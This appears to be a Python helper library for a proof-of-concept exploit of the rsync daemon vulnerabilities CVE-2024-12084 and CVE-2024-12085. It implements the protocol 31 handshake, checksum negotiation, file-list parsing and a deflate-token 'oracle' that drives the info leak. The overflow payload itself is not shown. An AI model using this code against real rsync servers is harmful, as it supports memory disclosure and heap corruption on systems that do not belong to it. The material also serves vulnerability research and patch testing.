"""
Minimal rsync protocol library for CVE-2024-12084/12085 PoC.
Implements just enough of protocol 31 (daemon mode, server-as-sender)
to drive the info leak and heap overflow.

Wire format references: rsync 3.2.7 source (io.c, flist.c, compat.c,
sender.c, token.c, exclude.c, clientserver.c).
"""

import socket
import struct
import urllib.parse
from collections import namedtuple

# ── Constants ────────────────────────────────────────────────────────
ITEM_TRANSFER_FLAG = 1 << 15  # ITEM_TRANSFER from rsync.h
MPLEX_BASE = 7
MSG_DATA = 0

# XMIT_* flags (rsync.h)
XMIT_TOP_DIR        = 1 << 0
XMIT_SAME_MODE      = 1 << 1
XMIT_EXTENDED_FLAGS = 1 << 2
XMIT_SAME_UID       = 1 << 3
XMIT_SAME_GID       = 1 << 4
XMIT_SAME_NAME      = 1 << 5
XMIT_LONG_NAME      = 1 << 6
XMIT_SAME_TIME      = 1 << 7
XMIT_NO_CONTENT_DIR = 1 << 8
XMIT_MOD_NSEC       = 1 << 13

# CF_* compat flags (compat.c)
CF_INC_RECURSE        = 1 << 0
CF_VARINT_FLIST_FLAGS = 1 << 7

# int_byte_extra table from io.c — varint length decoding
INT_BYTE_EXTRA = (
    [0]*32 +   # 0x00-0x7F /4
    [1]*16 +   # 0x80-0xBF /4
    [2]*8 + [3]*4 + [4]*2 + [5,6]  # 0xC0-0xFF /4
)

S_IFMT  = 0o170000
S_IFREG = 0o100000
S_IFDIR = 0o040000

def is_reg(mode):  return (mode & S_IFMT) == S_IFREG
def is_dir(mode):  return (mode & S_IFMT) == S_IFDIR


# ── rsync's "weak" checksum (get_checksum1 in checksum.c) ───────────
def adler32_rsync(data):
    """rsync's rolling checksum (NOT real adler32).
    NOTE: rsync casts bytes to SIGNED char, and CHAR_OFFSET=0."""
    def sb(x):  # signed-byte conversion
        return x - 256 if x >= 128 else x
    s1 = s2 = 0
    n = len(data)
    i = 0
    while i < n - 4:   # exact match for `i < (len-4)` in C
        b0, b1, b2, b3 = sb(data[i]), sb(data[i+1]), sb(data[i+2]), sb(data[i+3])
        s2 += 4*(s1 + b0) + 3*b1 + 2*b2 + b3
        s1 += b0 + b1 + b2 + b3
        i += 4
    while i < n:
        s1 += sb(data[i])
        s2 += s1
        i += 1
    return ((s1 & 0xffff) | ((s2 & 0xffff) << 16)) & 0xffffffff


FileEntry = namedtuple('FileEntry', 'name mode size mtime')


# ── Connection ───────────────────────────────────────────────────────
class RsyncConn:
    def __init__(self, sock, module, csum_choice):
        self.sock = sock
        self.module = module
        self.csum_choice = csum_choice
        self.in_multiplexed = False
        self.out_multiplexed = False
        self.compat_flags = 0
        self.checksum_seed = 0
        # input buffering for multiplexed reads
        self._mux_buf = b''
        # ndx encoding state
        self._wprev_pos = -1
        self._wprev_neg = 1
        self._rprev_pos = -1
        self._rprev_neg = 1

    # ── raw socket I/O ──────────────────────────────────────────────
    def _raw_send(self, data):
        self.sock.sendall(data)

    def _raw_recv(self, n):
        out = b''
        while len(out) < n:
            chunk = self.sock.recv(n - len(out))
            if not chunk:
                raise ConnectionError("connection closed")
            out += chunk
        return out

    def _raw_recv_line(self):
        out = b''
        while True:
            c = self.sock.recv(1)
            if not c or c == b'\n':
                break
            if c != b'\r':
                out += c
        return out.decode('latin-1')

    # ── pre-multiplex line/string output ────────────────────────────
    def write_line(self, s):
        """Send a NULL-terminated string. Used for args (raw) AND filters (mux).
        rsync daemon args use \\0 terminators, NOT \\n. Filters too."""
        data = s.encode('latin-1') + b'\x00'
        if self.out_multiplexed:
            self._mux_send(data)
        else:
            self._raw_send(data)

    # ── multiplexed output ──────────────────────────────────────────
    def _mux_send(self, payload, tag=MSG_DATA):
        """Wrap payload in MSG_DATA multiplexing header."""
        if not self.out_multiplexed:
            self._raw_send(payload)
            return
        # Header: 4 bytes little-endian: low 24 bits = length, high 8 = tag+MPLEX_BASE
        # Send in chunks <= 0xFFFFFF
        i = 0
        while i < len(payload):
            chunk = payload[i:i+0x4000]
            hdr = struct.pack('<I', len(chunk) | ((tag + MPLEX_BASE) << 24))
            self._raw_send(hdr + chunk)
            i += len(chunk)
        if len(payload) == 0:
            # zero-length still needs a header
            hdr = struct.pack('<I', (tag + MPLEX_BASE) << 24)
            self._raw_send(hdr)

    def write_raw_int(self, x):
        """Write a 4-byte little-endian int (multiplexed)."""
        self._mux_send(struct.pack('<i', x))

    def write_short_int(self, x):
        """Write a 2-byte little-endian short."""
        self._mux_send(struct.pack('<H', x & 0xffff))

    def write_byte(self, b):
        self._mux_send(bytes([b & 0xff]))

    def write_bulk(self, data):
        """Write arbitrary bytes (multiplexed)."""
        self._mux_send(bytes(data))

    def write_vstring(self, s):
        """Write a vstring: 1 or 2 length bytes, then data."""
        b = s.encode('latin-1') if isinstance(s, str) else bytes(s)
        n = len(b)
        if n > 0x7F:
            hdr = bytes([(n >> 8) | 0x80, n & 0xff])
        else:
            hdr = bytes([n])
        self._mux_send(hdr + b)

    def write_ndx(self, ndx):
        """write_ndx (io.c:2242). Diff-encoded against previous positive."""
        # NDX_DONE (= -1) sent as single 0 byte
        if ndx == -1:
            self._mux_send(b'\x00')
            return
        if ndx >= 0:
            diff = ndx - self._wprev_pos
            self._wprev_pos = ndx
            prefix = b''
        else:
            prefix = b'\xff'
            ndx = -ndx
            diff = ndx - self._wprev_neg
            self._wprev_neg = ndx
        if 0 < diff < 0xFE:
            self._mux_send(prefix + bytes([diff]))
        elif diff < 0 or diff > 0x7FFF:
            self._mux_send(prefix + bytes([0xFE,
                                           (ndx >> 24) | 0x80,
                                           ndx & 0xff,
                                           (ndx >> 8) & 0xff,
                                           (ndx >> 16) & 0xff]))
        else:
            self._mux_send(prefix + bytes([0xFE,
                                           (diff >> 8) & 0xff,
                                           diff & 0xff]))

    # ── multiplexed input ───────────────────────────────────────────
    def _mux_read(self, n):
        """Read n bytes of MSG_DATA payload, buffering across mux frames."""
        if not self.in_multiplexed:
            return self._raw_recv(n)
        while len(self._mux_buf) < n:
            hdr = struct.unpack('<I', self._raw_recv(4))[0]
            tag = (hdr >> 24) - MPLEX_BASE
            length = hdr & 0xFFFFFF
            payload = self._raw_recv(length) if length else b''
            if tag == MSG_DATA:
                self._mux_buf += payload
            elif tag in (1, 2, 3):  # MSG_INFO, MSG_ERROR, MSG_ERROR_XFER
                # Print and continue
                import sys
                sys.stderr.write(f"[server msg{tag}] {payload.decode('latin-1', 'replace')}")
            else:
                # ignore other message types
                pass
        out, self._mux_buf = self._mux_buf[:n], self._mux_buf[n:]
        return out

    def read_byte(self):
        return self._mux_read(1)[0]

    def read_int(self):
        return struct.unpack('<i', self._mux_read(4))[0]

    def read_short_int(self):
        return struct.unpack('<H', self._mux_read(2))[0]

    def read_buf(self, n):
        return self._mux_read(n)

    def read_varint(self):
        """read_varint (io.c:1794)."""
        u = bytearray(5)
        ch = self.read_byte()
        extra = INT_BYTE_EXTRA[ch >> 2]
        if extra:
            bit = 1 << (8 - extra)
            if extra >= 5:
                raise ValueError("varint overflow")
            u[:extra] = self._mux_read(extra)
            u[extra] = ch & (bit - 1)
        else:
            u[0] = ch
        v = struct.unpack('<I', bytes(u[:4]))[0]
        if v & 0x80000000:
            v -= 0x100000000
        return v

    def read_varlong(self, min_bytes):
        """read_varlong (io.c:1826)."""
        u = bytearray(9)
        b2 = self._mux_read(min_bytes)
        u[:min_bytes-1] = b2[1:]
        ch = b2[0]
        extra = INT_BYTE_EXTRA[ch >> 2]
        if extra:
            bit = 1 << (8 - extra)
            if min_bytes + extra > 9:
                raise ValueError("varlong overflow")
            u[min_bytes-1:min_bytes-1+extra] = self._mux_read(extra)
            u[min_bytes-1+extra] = ch & (bit - 1)
        else:
            u[min_bytes-1] = ch
        return struct.unpack('<q', bytes(u[:8]))[0]

    def read_vstring(self):
        n = self.read_byte()
        if n & 0x80:
            n = ((n & 0x7f) << 8) | self.read_byte()
        return self._mux_read(n).decode('latin-1') if n else ''

    def read_ndx(self):
        """read_ndx (io.c:2289)."""
        b = self.read_byte()
        if b == 0xFF:
            b = self.read_byte()
            neg = True
        elif b == 0:
            return -1  # NDX_DONE
        else:
            neg = False
        if b == 0xFE:
            b1 = self.read_byte()
            b2 = self.read_byte()
            if b1 & 0x80:
                # 4-byte absolute
                b3 = self.read_byte()
                b4 = self.read_byte()
                num = b2 | (b3 << 8) | (b4 << 16) | ((b1 & 0x7f) << 24)
            else:
                prev = self._rprev_neg if neg else self._rprev_pos
                num = (b1 << 8) + b2 + prev
        else:
            prev = self._rprev_neg if neg else self._rprev_pos
            num = b + prev
        if neg:
            self._rprev_neg = num
            return -num
        else:
            self._rprev_pos = num
            return num

    # ── protocol setup ──────────────────────────────────────────────
    def setup_protocol(self):
        """
        Mirrors what server does in compat.c:setup_protocol() when am_server=1, am_sender=1.
        We are the client (receiver).
        """
        # Server is am_server, so it WRITES compat_flags as varint.
        # But this happens BEFORE multiplexing is on.
        # Read compat_flags as varint (compat.c:738) — read_varint is compatible
        # with single-byte values < 0x80.
        # NOTE: this read is on the RAW socket, not multiplexed yet.
        old_in_mux = self.in_multiplexed
        self.in_multiplexed = False
        self.compat_flags = self.read_varint()
        # Verify CF_VARINT_FLIST_FLAGS — needed for our file list parsing
        # (we sent 'v' in -e.v so this should be set)
        assert self.compat_flags & CF_VARINT_FLIST_FLAGS, \
            f"expected CF_VARINT_FLIST_FLAGS, got {self.compat_flags:#x}"
        # CF_INC_RECURSE must be off (we sent --no-inc-recursive)
        assert not (self.compat_flags & CF_INC_RECURSE), \
            f"inc_recurse unexpectedly on: {self.compat_flags:#x}"

        # negotiate_the_strings (compat.c:534) — both sides call this.
        # Both sides send_negotiate_str FIRST (writes to wire if do_negotiated_strings),
        # then both recv_negotiate_str. So: we send, server sends, both proceed.
        # All on RAW socket (pre-multiplex).
        #
        # Send our checksum preference (we want to force csum_choice to win)
        self._raw_send(bytes([len(self.csum_choice)]) + self.csum_choice.encode())
        # Read server's checksum list
        n = self._raw_recv(1)[0]
        if n & 0x80:
            n = ((n & 0x7f) << 8) | self._raw_recv(1)[0]
        server_csums = self._raw_recv(n).decode() if n else ''
        # Compress: only negotiated if do_compression && !compress_choice.
        # We always send --compress-choice=zlib OR --no-compress, so the server
        # never enters compress negotiation. Skip.

        # Server writes checksum_seed (compat.c:813) — raw 4-byte int
        self.checksum_seed = struct.unpack('<i', self._raw_recv(4))[0]

        # Now multiplexing kicks in:
        #   server: io_start_multiplex_out → server output multiplexed
        #   server: io_start_multiplex_in (need_messages_from_generator) → server input multiplexed
        self.in_multiplexed = True
        self.out_multiplexed = True

    # ── file list parsing ───────────────────────────────────────────
    def read_file_list(self):
        """
        Parse file list sent by server (send_file_list → send_file_entry).
        With xfer_flags_as_varint=1, each entry starts with varint flags.
        Termination: varint 0, then varint io_error.

        We sent --no-owner --no-group --no-acls --no-devices --no-specials
        --no-links --no-hard-links --no-atimes --no-crtimes, so the per-entry
        format reduces to:
          xflags (varint)
          [if SAME_NAME] l1 (byte)
          [if LONG_NAME] l2 (varint) else l2 (byte)
          name[l2]
          file_length (varlong, min_bytes=3)
          [if !SAME_TIME] modtime (varlong, min_bytes=4)
          [if MOD_NSEC] nsec (varint)
          [if !SAME_MODE] mode (int)
          [if --checksum && S_ISREG] checksum (file_sum_len bytes)
        """
        files = []
        lastname = ''
        lastmode = 0
        lastmtime = 0
        # We sent --checksum, so each regular file includes file_sum.
        # But we don't know file_sum_len until after parse_checksum_choice.
        # The chosen csum is what we negotiated. Hardcode common lengths:
        csum_lens = {'xxh64': 8, 'xxh3': 8, 'xxh128': 16, 'sha1': 20,
                     'md5': 16, 'md4': 16}
        file_sum_len = csum_lens.get(self.csum_choice, 16)

        while True:
            xflags = self.read_varint()
            if xflags == 0:
                self.read_varint()  # io_error
                break

            # Name
            l1 = self.read_byte() if (xflags & XMIT_SAME_NAME) else 0
            if xflags & XMIT_LONG_NAME:
                l2 = self.read_varint()
            else:
                l2 = self.read_byte()
            name_tail = self._mux_read(l2).decode('latin-1', errors='replace')
            name = lastname[:l1] + name_tail
            lastname = name

            # File length (read_varlong30 with protocol>=30 → varlong min_bytes=3)
            size = self.read_varlong(3)

            # Modtime
            if not (xflags & XMIT_SAME_TIME):
                lastmtime = self.read_varlong(4)
            mtime = lastmtime
            if xflags & XMIT_MOD_NSEC:
                self.read_varint()  # discard

            # Mode
            if not (xflags & XMIT_SAME_MODE):
                lastmode = self.read_int()
                # from_wire_mode is identity for normal mode bits on linux
            mode = lastmode

            # We disabled atimes/crtimes/uid/gid/devices/specials/links/hardlinks/acls
            # so nothing else to read for those.

            # Checksum (only for regular files when --checksum was sent)
            if is_reg(mode):
                self._mux_read(file_sum_len)  # discard

            files.append(FileEntry(name, mode, size, mtime))

        # Server calls flist_sort_and_clean AFTER sending. The ndx we send back
        # references the SORTED order. rsync's f_name_cmp ≈ strcmp on path; for
        # a flat directory, Python's bytewise string sort matches.
        files.sort(key=lambda f: f.name.encode('latin-1'))
        return files

    # ── download a file (Phase 1 setup) ─────────────────────────────
    def download_file(self, ndx, file_entry):
        """
        Request a file with empty checksums (force full transfer).
        Returns the file content. No compression.
        """
        # Send: ndx, iflags, sum_head with count=0
        self.write_ndx(ndx)
        self.write_short_int(ITEM_TRANSFER_FLAG)
        self.write_raw_int(0)  # count=0
        self.write_raw_int(0)  # blength=0
        self.write_raw_int(0)  # s2length=0
        self.write_raw_int(0)  # remainder=0

        # Server echoes ndx + iflags
        self.read_ndx()
        self.read_short_int()
        # Server echoes sum_head
        self.read_int(); self.read_int(); self.read_int(); self.read_int()

        # Server now sends data via simple_send_token format (no compression):
        #   while (token = read_int()) > 0: read_buf(token bytes)
        #   token <= 0 → done (or matched, but with count=0 there are no matches)
        data = b''
        while True:
            tok = self.read_int()
            if tok <= 0:
                break
            data += self._mux_read(tok)
        # File checksum trailer (file_sum_len bytes from sum_end)
        csum_lens = {'xxh64': 8, 'xxh3': 8, 'xxh128': 16, 'sha1': 20,
                     'md5': 16, 'md4': 16}
        file_sum_len = csum_lens.get(self.csum_choice, 16)
        self._mux_read(file_sum_len)
        # Need to send NDX_DONE to signal we're done with this phase
        # (but exploit closes connection after, so might not be needed)
        return data

    # ── deflate token (Phase 1 oracle) ──────────────────────────────
    def receive_deflate_token(self):
        """
        Read ONE deflate token signal. Returns (signal, data).
        signal < 0 → matched a block (TOKEN). signal >= 0 → data (no match).
        We only care about the FIRST signal as the oracle.
        """
        flag = self.read_byte()
        if flag == 0:  # END_FLAG
            return 0, b''
        if (flag & 0xC0) == 0x40:  # DEFLATED_DATA
            n = ((flag & 0x3f) << 8) | self.read_byte()
            payload = self._mux_read(n)
            return n, payload  # n > 0 → no match
        if flag & 0x80:  # TOKEN_REL
            tok = flag & 0x3f
            return -1 - tok, b''  # negative → match!
        if flag in (0x20, 0x21):  # TOKEN_LONG / TOKENRUN_LONG
            tok = self.read_int()
            return -1 - tok, b''  # negative → match!
        # Unknown flag — treat as no-match
        return flag, b''

    def close(self):
        try:
            self.sock.close()
        except:
            pass


# ── Public API ───────────────────────────────────────────────────────
def connect(url, proto_ver, csum_choice):
    """
    Connect to rsync daemon and complete handshake up through args.
    The caller must then call setup_protocol() after sending args.

      url:         rsync://host:port/module
      proto_ver:   '31' (string)
      csum_choice: transfer checksum to negotiate ('xxh64' or 'sha1')
    """
    p = urllib.parse.urlparse(url)
    host = p.hostname
    port = p.port or 873
    module = p.path.lstrip('/').rstrip('/') or 'files'

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.connect((host, port))

    rc = RsyncConn(sock, module, csum_choice)

    # 1. Server greeting: "@RSYNCD: 31.0 <auth csums>\n"
    greeting = rc._raw_recv_line()
    # 2. Send our greeting. The auth checksum here is for daemon auth, NOT
    #    transfer. We pick md5 (always supported). The transfer checksum
    #    (csum_choice) is negotiated later in setup_protocol.
    rc._raw_send(f"@RSYNCD: {proto_ver}.0 md5\n".encode())
    # 3. Send module name
    rc._raw_send((module + '\n').encode())
    # 4. Read responses until "@RSYNCD: OK"
    while True:
        line = rc._raw_recv_line()
        if line == '@RSYNCD: OK':
            break
        if line.startswith('@ERROR'):
            raise RuntimeError(f"daemon error: {line}")
        if line.startswith('@RSYNCD: EXIT'):
            raise RuntimeError("daemon EXIT")
        # otherwise: motd or other info, ignore

    # 5. Caller now sends args via write_line(), terminated by write_line('')
    return rc
